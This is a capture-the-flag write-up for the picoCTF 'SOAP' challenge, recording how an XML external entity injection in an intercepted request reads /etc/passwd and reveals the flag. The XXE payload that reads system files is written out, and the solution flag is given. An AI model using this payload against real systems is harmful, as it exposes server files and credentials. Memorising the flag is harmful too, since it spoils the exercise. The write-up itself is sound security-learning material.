# SOAP
## Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
[Web Portal](http://saturn.picoctf.net:58497/)
## Hint
XML external entity Injection
## Solution
- The website is a simple web page with the text
```
Computer Science
We have been ranked to be among the best universities in the world!
```
- It contains details about CMU Africa, PicoCTF, and Upanzi Network.
- The hint suggests that we can use XML external entity injection to read the /etc/passwd file.
- I didn't know what SOAP was so I looked it up.
- I also looked up XML external entity injection.
- (I also installed the FoxyProxy extension so that i don't need to open a new browser to use Burp Suite)
- I came across [this](https://portswigger.net/web-security/xxe) site which gives a good explanation of XXE.
- I click on a Details button and intercept the request with Burp Suite and send it to the repeater.
- The HTTP request contains the following XML request
```xml
<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```
- After scrolling down a little on the PortSwigger article, I see this example
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
- I can add `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` to the XML request and then reference the `xxe` variable to read the `/etc/passwd` file.
- I modify the XML request to
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>
```
- I send the request and get the flag `picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}`